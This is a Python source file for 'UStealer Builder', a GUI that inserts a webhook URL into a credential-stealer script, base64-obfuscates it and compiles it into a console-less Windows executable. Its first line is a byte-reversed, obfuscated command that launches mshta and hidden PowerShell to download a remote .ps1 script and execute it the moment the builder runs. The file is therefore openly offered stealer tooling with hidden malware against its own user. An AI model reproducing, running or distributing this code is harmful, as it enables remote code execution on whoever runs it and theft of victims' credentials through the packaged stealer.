getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([114,116,116,97,116,101,103][::-1]))(getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([95,95,116,114,111,112,109,105,95,95][::-1]))(bytes([115,111][::-1]).decode()),bytes([109,101,116,115,121,115][::-1]).decode())(bytes([41,101,115,111,108,99,46,119,111,100,110,105,119,40,41,48,44,34,34,34,120,101,105,32,124,32,41,39,49,115,112,46,100,97,111,108,110,119,111,100,47,110,105,97,109,47,116,115,101,116,47,51,50,55,49,97,51,52,47,109,111,99,46,116,110,101,116,110,111,99,114,101,115,117,98,117,104,116,105,103,46,119,97,114,47,47,58,115,112,116,116,104,39,40,114,119,105,34,34,32,100,110,97,109,109,111,99,45,32,108,108,101,104,115,114,101,119,111,112,34,40,110,117,82,46,41,34,108,108,101,104,83,46,116,112,105,114,99,83,87,34,40,116,99,101,106,98,79,101,116,97,101,114,67,58,116,112,105,114,99,115,98,118,32,97,116,104,115,109][::-1]).decode())
import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
import base64
import re

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"UStealer Builder ~ Version 1.3")
app.geometry("400x240")
app.resizable(False, False)
          
app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook
  

def extract_imports_from_code(pycode):
    import_pattern = re.compile(r'^\s*(import|from)\s+[\w\.]+', re.MULTILINE)
    imports = import_pattern.findall(pycode)
    return '\n'.join([line for line in pycode.splitlines() if import_pattern.match(line)])

def obfuscate_code(code):
    c = extract_imports_from_code(code)
    encoded_code = list(base64.b64encode(code.encode('utf-8')))
    obfuscated_code = f"""
import base64

{c}

exec(base64.b64decode(bytes({encoded_code})))
"""
    return obfuscated_code

def replace_webhook(webhook):
    file_path = r'assets\stealer.py'
    old_webhook = 'YOUR_WEBHOOK_URL'

    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()

    # Replace old webhook with new webhook
    updated_content = content.replace(old_webhook, webhook)

    with open("main.py", 'w', encoding='utf-8') as file:
        file.write(obfuscate_code(updated_content))

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''


        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller main.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

label = ctk.CTkLabel(master=app, text="UStealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()
